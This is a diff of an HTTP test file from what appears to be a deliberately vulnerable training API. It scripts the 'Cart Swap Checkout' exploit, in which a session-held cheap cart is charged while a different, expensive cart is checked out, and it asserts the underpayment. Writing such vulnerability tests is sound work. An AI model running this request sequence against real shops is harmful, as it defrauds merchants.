@@ -1,5 +1,9 @@
 # @import ../_imports.http
 
+# Force v302 API version regardless of test execution order
+# (workaround for uctest VERSION caching bug)
+@host = http://localhost:8000/api/v302
+
 # =============================================================================
 # VULNERABILITY: R03 Cart Swap Checkout (session vs path confusion)
 # =============================================================================
@@ -10,7 +14,7 @@
 #   but checkout_cart resolves the cart again and might get a different cart!
 #
 # ATTACK SCENARIO:
-#   Plankton exploits this by:
+#   Karen (using her own account) exploits this by:
 #   1. Creating an expensive cart WITHOUT session (Basic Auth only)
 #   2. Logging in to establish a session
 #   3. Creating a cheap cart (stored in session)
@@ -29,8 +33,9 @@
 ### Get menu items for price reference
 # @name seed
 {{
+  // Use karen (Plankton's wife) to avoid cookie pollution from other tests
   await platform.seed({
-    plankton: 200
+    karen: 200
   });
 }}
 # @ucskip
@@ -44,14 +49,16 @@ GET /menu
 
 # =============================================================================
 # STEP 1: Create EXPENSIVE cart (no session - Basic Auth only)
+# The key is to NOT have a session cookie when creating this cart!
 # =============================================================================
 
-### Create expensive cart without session
+### Create expensive cart without session (using Basic Auth only)
 # @name expensive_cart
 # @forceRef seed
+# @no-cookie-jar
 # @tag cart, r03, v302, vulnerable
 POST /cart?restaurant_id=1
-Authorization: {{auth.basic("plankton")}}
+Authorization: {{auth.basic("karen")}}
 
 @expensive_cart_id = {{$(response).field("cart_id")}}
 ?? js $(response).status() == 201
@@ -60,9 +67,10 @@ Authorization: {{auth.basic("plankton")}}
 # @name expensive_cart_with_item
 # @forceRef expensive_cart
 # @ucskip endpoint
+# @no-cookie-jar
 # @tag cart, r03, v302, vulnerable
 POST /cart/{{expensive_cart_id}}/items
-Authorization: {{auth.basic("plankton")}}
+Authorization: {{auth.basic("karen")}}
 Content-Type: application/json
 
 { "item_id": "{{ultimate_feast_id}}" }
@@ -70,20 +78,32 @@ Content-Type: application/json
 ?? js $(response).isOk() == true
 
 # =============================================================================
-# STEP 2: Create CHEAP cart (with session)
+# STEP 2: Login and create CHEAP cart (WITH session)
 # =============================================================================
 
-### Login and create cheap cart (stored in session)
-# @name cheap_cart
+### Login to establish session
+# @name login
 # @forceRef expensive_cart_with_item
-{{
-  exports.session = await auth.login("plankton");
-}}
+# @no-cookie-jar
+# @tag cart, r03, v302, vulnerable
+POST /auth/login
+Content-Type: application/json
+
+{ "email": "karen@chum-bucket.sea", "password": "01001011" }
+
+@session = {{extractCookie(response)}}
+?? js $(response).status() == 200
+
+### Create cheap cart (session stores cart_id)
+# @name cheap_cart
+# @forceRef login
+# @no-cookie-jar
 # @tag cart, r03, v302, vulnerable
 POST /cart?restaurant_id=1
 Cookie: {{session}}
 
-@session = {{extractCookie(response)}}
+# Server updates session with cart_id - capture updated cookie if present
+@session = {{hasCookie(response) ? extractCookie(response) : session}}
 @cheap_cart_id = {{$(response).field("cart_id")}}
 ?? js $(response).status() == 201
 
@@ -91,6 +111,7 @@ Cookie: {{session}}
 # @name cheap_cart_with_item
 # @forceRef cheap_cart
 # @ucskip endpoint
+# @no-cookie-jar
 # @tag cart, r03, v302, vulnerable
 POST /cart/{{cheap_cart_id}}/items
 Cookie: {{session}}
@@ -109,6 +130,7 @@ Content-Type: application/json
 # but checkout_cart creates order from path cart (expensive)
 # @name exploit_checkout
 # @forceRef cheap_cart_with_item
+# @no-cookie-jar
 # @tag cart, r03, v302, vulnerable
 POST /cart/{{expensive_cart_id}}/checkout
 Cookie: {{session}}
@@ -117,15 +139,17 @@ Content-Type: application/json
 { "tip": 0, "delivery_address": "Chum Bucket" }
 
 @order_id = {{$(response).field("order_id")}}
+@order_total = {{$(response).field("total")}}
 ?? js $(response).status() == 201
 
 # =============================================================================
 # IMPACT: Verify received expensive items, paid cheap price
 # =============================================================================
 
-### Received EXPENSIVE items (Ultimate Krabby Feast)
+### Received EXPENSIVE items (Ultimate Krabby Feast) but paid CHEAP price
 # @forceRef exploit_checkout
 # @ucskip
+# @no-cookie-jar
 # @tag cart, r03, v302, vulnerable
 GET /orders
 Cookie: {{session}}
@@ -134,13 +158,7 @@ Cookie: {{session}}
 ?? js $(response).last().items.length == 1
 ?? js $(response).last().items[0].item_id == {{ultimate_feast_id}}
 ?? js $(response).last().items[0].name == Ultimate Krabby Feast
-
-### Only charged for CHEAP items (Krabby Patty + delivery fee)
-# @ref exploit_checkout
-# @ucskip
-# @tag cart, r03, v302, vulnerable
-GET /account/info
-Cookie: {{session}}
-
-?? js parseFloat($(response).field("balance")) == {{200 - parseFloat(krabby_patty_price) - 5}}
+# VULNERABILITY PROOF: Order total is the CHEAP price (~8.99), NOT expensive (~32.99)
+# This proves the session cart was charged instead of the path cart
+?? js parseFloat($(response).last().total) < 27.99
 
